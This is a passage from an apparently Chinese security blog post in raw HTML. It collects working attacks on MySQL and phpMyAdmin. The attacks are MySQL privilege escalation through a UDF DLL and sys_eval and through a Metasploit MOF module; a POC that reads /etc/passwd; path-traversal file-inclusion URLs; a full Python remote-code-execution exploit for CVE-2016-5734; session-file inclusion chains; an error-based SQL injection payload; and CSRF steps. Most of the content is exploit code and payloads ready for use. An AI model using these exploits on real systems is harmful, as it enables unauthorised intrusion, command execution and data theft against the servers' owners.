class="keyword">like</span> <span class="operator">%</span>plugin<span class="operator">%</span>；<span class="operator">/</span><span class="operator">/</span> 查看插件目录</span><br></pre></td></tr></table></figure><p>(2) 5.0 &lt;&#x3D; Mysql version &lt;5.1时，需要导出至目标服务器的系统目录，如C:&#x2F;&#x2F;Windows&#x2F;System32<br>(3) Mysql version &lt; 5.0 时，目录可以自定义具体利用如下：<br>a 根据目标mysql版本写入特定目录的so或者dll，可以参考sqlmap里面的</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;It is dll&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\Program Files\MySQL\MySQL Server 5.1\l ib\plugin\lib_mysqludf_sys.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>b 创建对应的function：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname &quot;lib_mysqludf_sys.dll&quot;;</span><br></pre></td></tr></table></figure><p>c 执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;sys_eval&#x27;</span>;    #查看创建的sys_eval函数<span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);                           #使用系统命令</span><br></pre></td></tr></table></figure><h2 id="2-3-MOF提权："><a href="#2-3-MOF提权：" class="headerlink" title="2.3 MOF提权："></a>2.3 MOF提权：</h2><p>通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次上传的MOF。一般适用于Windows &lt;&#x3D; 2003，并且<code>C:\Windows\System32\mof</code>目录具有写权限（一般是没有权限写）。可以使用MSF直接利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.1.5</span><br><span class="line"><span class="built_in">set</span> rport 3306</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_labelTop">回到顶部</a></p><h1 id="3PhpMyAdmin漏洞利用"><a href="#3PhpMyAdmin漏洞利用" class="headerlink" title="3PhpMyAdmin漏洞利用"></a>3PhpMyAdmin漏洞利用</h1><h2 id="3-1-WooYun-2016-199433：任意文件读取漏洞"><a href="#3-1-WooYun-2016-199433：任意文件读取漏洞" class="headerlink" title="3.1 WooYun-2016-199433：任意文件读取漏洞"></a>3.1 WooYun-2016-199433：任意文件读取漏洞</h2><p>影响范围：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">2.x版本</span></span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /scripts/setup.php HTTP/1.1 </span><br><span class="line"><span class="section">Host: your-ip:8080</span></span><br><span class="line"><span class="section">Accept-Encoding: gzip, deflate Accept: */*</span></span><br><span class="line"><span class="section">Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)</span></span><br><span class="line"><span class="section">Connection: close</span></span><br><span class="line"><span class="section">Content-Type: application/x-www-form-urlencoded </span></span><br><span class="line"><span class="section">Content-Length: 80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action=test&amp;configuration=O:10:<span class="string">&quot;PMA_Config&quot;</span>:1:&#123;s:6:<span class="string">&quot;source&quot;</span>,s:11:<span class="string">&quot;/etc/passwd&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-CVE-2014-8959：本地文件包含"><a href="#3-2-CVE-2014-8959：本地文件包含" class="headerlink" title="3.2 CVE-2014 -8959：本地文件包含"></a>3.2 CVE-2014 -8959：本地文件包含</h2><p>影响范围：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">4.0.1~4.2.12</span></span><br><span class="line"><span class="code">PHP version</span></span><br><span class="line"><span class="code">&lt; 5.3.4</span></span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00    </span><br><span class="line"><span class="comment"># 注意改下token值</span></span><br></pre></td></tr></table></figure><p>在实际利用中可以利用写入文件到&#x2F;tmp目录下结合此漏洞完成RCE，php版本可以通过http header、导出表内容到文件的附加内容看到。</p><h2 id="3-3-CVE-2016-5734-：后台命令执行RCE"><a href="#3-3-CVE-2016-5734-：后台命令执行RCE" class="headerlink" title="3.3 CVE-2016-5734 ：后台命令执行RCE"></a>3.3 CVE-2016-5734 ：后台命令执行RCE</h2><p>影响范围：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">4.0.10.16 之前的4.0.x版本</span></span><br><span class="line"><span class="code">4.4.15.7 之前的 4.4.x版本</span></span><br><span class="line"><span class="code">4.6.3之前的 4.6.x版本</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">PHP version</span><br><span class="line"><span class="code">4.3.0~5.4.6</span></span><br><span class="line"><span class="code">Php 5.0 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</span></span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span></span><br><span class="line"><span class="string">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span></span><br><span class="line"><span class="string">CVE: CVE-2016-5734</span></span><br><span class="line"><span class="string">Author: https://twitter.com/iamsecurity</span></span><br><span class="line"><span class="string">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;@iamsecurity&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;URL with path to PMA&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;PHP command(s) to eval()&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--pwd&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Password for valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="string">&quot;--dbs&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Existing database at a server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--table&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Custom table name for exploit.&quot;</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">&quot;test&quot;</span></span><br><span class="line">    token = <span class="literal">False</span></span><br><span class="line">    custom_table = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="literal">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">&quot;prgpwn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;system(&#x27;uname -a&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">32</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="comment"># you can manually add proxy support it&#x27;s very simple ;)</span></span><br><span class="line">    <span class="comment"># s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    sql = <span class="string">&#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get_token</span></span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">&quot;/?lang=en&quot;</span>, <span class="built_in">dict</span>(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">        token_place = resp.text.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">        token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Cannot get valid authorization token.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;is_js_confirmed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">            <span class="string">&quot;pos&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sql_query&quot;</span>: sql,</span><br><span class="line">            <span class="string">&quot;sql_delimiter&quot;</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;show_query&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fk_checks&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SQL&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_page_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + <span class="string">&quot;/import.php&quot;</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                <span class="keyword">if</span> resp.json()[<span class="string">&quot;success&quot;</span>] <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    first = resp.json()[<span class="string">&quot;error&quot;</span>][resp.json()[<span class="string">&quot;error&quot;</span>].find(<span class="string">&quot;&lt;code&gt;&quot;</span>)+<span class="number">6</span>:]</span><br><span class="line">                    error = first[:first.find(<span class="string">&quot;&lt;/code&gt;&quot;</span>)]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;already exists&quot;</span> <span class="keyword">in</span> error:</span><br><span class="line">                        <span class="built_in">print</span>(error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;ERROR: &quot;</span> + error)</span><br><span class="line">                        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># build exploit</span></span><br><span class="line">    exploit = &#123;</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">        <span class="string">&quot;table&quot;</span>: table,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;goto&quot;</span>: <span class="string">&quot;sql.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;find&quot;</span>: <span class="string">&quot;0/e\0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;replaceWith&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;columnIndex&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;useRegex&quot;</span>: <span class="string">&quot;on&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + <span class="string">&quot;/tbl_find_replace.php&quot;</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        result = resp.json()[<span class="string">&quot;message&quot;</span>][resp.json()[<span class="string">&quot;message&quot;</span>].find(<span class="string">&quot;&lt;/a&gt;&quot;</span>)+<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;result: &quot;</span> + result)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;Exploit failed!\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Remember that servers with PHP version greater than 5.4.6&quot;</span></span><br><span class="line">            <span class="string">&quot; is not exploitable, because of warning about null byte in regexp&quot;</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>利用如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cve-2016-5734.py -u root --<span class="built_in">pwd</span>=<span class="string">&quot;&quot;</span> http://localhost/pma -c <span class="string">&quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><h2 id="3-4-CVE-2018-12613：后台文件包含"><a href="#3-4-CVE-2018-12613：后台文件包含" class="headerlink" title="3.4 CVE-2018-12613：后台文件包含"></a>3.4 CVE-2018-12613：后台文件包含</h2><p>影响范围：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">4.8.0和4.8.1</span></span><br></pre></td></tr></table></figure><p>利用如下：<br>（1）执行SQL语句，将PHP代码写入Session文件中：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="keyword">exit</span>;<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure><p>（2）包含session文件：(注意这里是默认了根目录是 <code>网站/phpmyadmin/</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.1.10/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_*** </span><br><span class="line"><span class="comment"># *** 为phpMyAdmin的COOKIE值</span></span><br></pre></td></tr></table></figure><h2 id="3-5-CVE-2018-19968：任意文件包含-x2F-RCE"><a href="#3-5-CVE-2018-19968：任意文件包含-x2F-RCE" class="headerlink" title="3.5 CVE-2018-19968：任意文件包含&#x2F;RCE"></a>3.5 CVE-2018-19968：任意文件包含&#x2F;RCE</h2><p>影响范围：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">4.8.0~4.8.3</span></span><br></pre></td></tr></table></figure><p>利用如下：<br>（1）创建数据库，并将PHP代码写入Session文件中</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><span class="language-xml">&#x27;;</span></span><br></pre></td></tr></table></figure><p>（2）生成foo数据库的phpMyAdmin的配置表，访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.1.10/chk_rel.php?fixall_pmadb=1&amp;db=foo</span><br></pre></td></tr></table></figure><p>（3）篡改数据插入pma column_info中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span>` pma__column_infoSELECT <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>, <span class="string">&#x27;plop&#x27;</span>,<span class="string">&#x27;plop&#x27;</span>, <span class="string">&#x27; plop&#x27;</span>, <span class="string">&#x27;plop&#x27;</span>,<span class="string">&#x27;../../../../../../../../tmp/sess_***&#x27;</span>,<span class="string">&#x27;plop&#x27;</span>; # <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> 为phpMyAdmin 的COOKIE值</span><br></pre></td></tr></table></figure><p>这里要注意不用系统的session保存位置不同，具体系统可以在phpMyAdmin登录后首页看到</p><p>MacOS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/tmp</span><br></pre></td></tr></table></figure><p>Linux：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions</span><br></pre></td></tr></table></figure><p>phpStudy：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpstudy/PHPTutorial/tmp/tmp</span><br></pre></td></tr></table></figure><p>（4）访问包含Session文件的地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1.1.10/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[ multi_edit][][]=baz&amp;clause_is_unique=1</span><br></pre></td></tr></table></figure><h2 id="3-6-CVE-2020-0554：后台SQL注入"><a href="#3-6-CVE-2020-0554：后台SQL注入" class="headerlink" title="3.6 CVE-2020-0554：后台SQL注入"></a>3.6 CVE-2020-0554：后台SQL注入</h2><p>影响范围：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">phpMyAdmin 4&lt; 4.9.4</span></span><br><span class="line"><span class="code">phpMyAdmin 5&lt; 5.0.1</span></span><br><span class="line"><span class="code">前提：已知一个用户名密码</span></span><br></pre></td></tr></table></figure><p>简单总结流程：</p><p>页面位置<code>server_privileges.php</code>；</p><p>设置变量<code>ajax_requests为true</code>；</p><p>设置变量<code>validate_username</code> 为真值；</p><p>设置变量<code>username</code> 为我们拼接的注入语句。</p><p>构造payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//192.168.209.139:8001/server_privileges.php?ajax_requests=true&amp;validate_username=1&amp;username=1%27or%201=1%20--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></span><br></pre></td></tr></table></figure><p>（token和其余参数会在访问页面的时候自动提供）</p><p>我们查看后端收到的数据，可以看到SQL已经成功拼接。</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153855019-226491722.png" alt="img"></p><p>执行完毕后程序只会告知SQL是否执行成功，失败会报错，因此此处我们可以利用报错注入。</p><p>构造payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//192.168.209.139:8001/server_privileges.php?ajax_request=true&amp;validate_username=1&amp;username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></span><br></pre></td></tr></table></figure><p>结果如下，可以看到已经成功执行了我们注入的指令。</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153902353-723535547.png" alt="img"></p><p><a href="https://cloud.tencent.com/developer/article/1599837">CVE-2020-0554：phpMyAdmin后台SQL注入</a></p><h2 id="3-7-CVE-2019-12922-跨站请求伪造"><a href="#3-7-CVE-2019-12922-跨站请求伪造" class="headerlink" title="3.7 CVE-2019-12922 跨站请求伪造"></a>3.7 CVE-2019-12922 跨站请求伪造</h2><p>影响范围：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="code">&lt;= 4.9.0.1</span></span><br></pre></td></tr></table></figure><p>利用如下：</p><p>在登录状态下，添加一个服务器</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153909869-1655502862.png" alt="img"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//192.168.123.65/phpmyadmin/setup/index.php</span></span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153916720-959046693.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153924147-810378326.png" alt="img"></p><p>点击删除时，通过工具抓包</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153933405-797280621.png" alt="img"></p><p>参数id对应的是第几个服务器。构造恶意链接。</p><p>当然实战中的链接怎么吸引人让目标去点击还得靠自己去构造。</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153938652-2011200675.png" alt="img"></p><p>页面显示404，但img的src会去请求一次。此时创建了两个服务器</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153942587-1621023840.png" alt="img"></p><p>点击我们构造的恶意链接时，显示刚才构造的页面结果</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153947778-376804677.png" alt="img"></p><p>此时再去查看服务器</p><p><img src="https://img2020.cnblogs.com/blog/1605154/202010/1605154-20201014153951834-327482848.png" alt="img"></p><p>已经被删除，攻击成功。</p><p><a href="https://cloud.tencent.com/developer/article/1517920">CVE-2019-12922 phpMyAdmin 4.9.0.1-跨站请求伪造漏洞复现</a></p><h2 id="3-8-CVE-2017-1000499-跨站请求伪造"><a href="#3-8-CVE-2017-1000499-跨站请求伪造" class="headerlink" title="3.8 CVE-2017-1000499 跨站请求伪造"></a>3.8 CVE-2017-1000499 跨站请求伪造</h2><p>影响范围：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line"><span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">6</span>  </span><br><span class="line"><span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">0</span><span class="symbol">:Beta1</span>  </span><br><span class="line"><span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">0</span><span class="symbol">:Rc1</span> 